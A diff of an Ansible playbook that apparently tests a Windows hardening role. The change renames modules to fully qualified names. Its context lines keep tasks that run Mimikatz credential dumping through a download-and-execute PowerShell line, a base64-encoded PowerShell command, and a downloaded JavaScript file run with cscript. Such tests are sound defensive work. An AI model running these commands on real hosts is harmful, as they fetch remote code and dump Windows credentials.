@@ -4,7 +4,7 @@
 # https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1
 # https://www.blackhillsinfosec.com/bypass-anti-virus-run-mimikatz/, Jan 2017
 - name: Testing | call mimikatz in different ways...
-  win_shell: "{{ item }}"
+  ansible.windows.win_shell: "{{ item }}"
   with_items:
     - IEX (New-Object Net.WebClient).DownloadString('http://is.gd/oeoFuI'); Invoke-Mimikatz -DumpCreds
     # https://gist.github.com/gfoss/ca6aa37f97fd400ff14f
@@ -15,7 +15,7 @@
   failed_when: false
 
 - name: Testing | call mimikatz in different ways - 2
-  win_command: "{{ item }}"
+  ansible.windows.win_command: "{{ item }}"
   with_items:
     # encoded-mimikatz
     - powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AUABvAHcAZQByAFMAaABlAGwAbABNAGEAZgBpAGEALwBQAG8AdwBlAHIAUwBwAGwAbwBpAHQALwBtAGEAcwB0AGUAcgAvAEUAeABmAGkAbAB0AHIAYQB0AGkAbwBuAC8ASQBuAHYAbwBrAGUALQBNAGkAbQBpAGsAYQB0AHoALgBwAHMAMQAnACkAOwAgACQAbQAgAD0AIABJAG4AdgBvAGsAZQAtAE0AaQBtAGkAawBhAHQAegAgAC0ARAB1AG0AcABDAHIAZQBkAHMAOwAgACQAbQAKAA==
@@ -24,7 +24,7 @@
   failed_when: false
 
 - name: Testing | download mimikatz in javascript
-  win_get_url:
+  ansible.windows.win_get_url:
     url: https://gist.githubusercontent.com/500646/14051b27b45dce37818aca915e93062f/raw/2adcc9d2570b4367c6cc405e5a5969863d04fc9b/katz.js
     dest: "{{ harden_win_temp_dir }}\\katz.js"
   failed_when: false
@@ -32,7 +32,7 @@
   until: katzdl is success
 
 - name: Testing | call mimikatz in javascript
-  win_command: "cscript.exe {{ harden_win_temp_dir }}\\katz.js"
+  ansible.windows.win_command: "cscript.exe {{ harden_win_temp_dir }}\\katz.js"
   failed_when: false
   when: katzdl is succeeded
 
@@ -40,7 +40,7 @@
 # PowerShell Version 2 Command [Your Command Here]
 
 - name: Appveyor | Ensure wuauserv is not disabled
-  win_service:
+  ansible.windows.win_service:
     name: wuauserv
     state: started
     start_mode: auto
@@ -50,7 +50,7 @@
 
 # https://github.com/skelsec/pypykatz
 - name: Testing | Ensure python is present
-  win_chocolatey:
+  chocolatey.chocolatey.win_chocolatey:
     name: python
     state: present
   # https://github.com/ansible/ansible/issues/59352
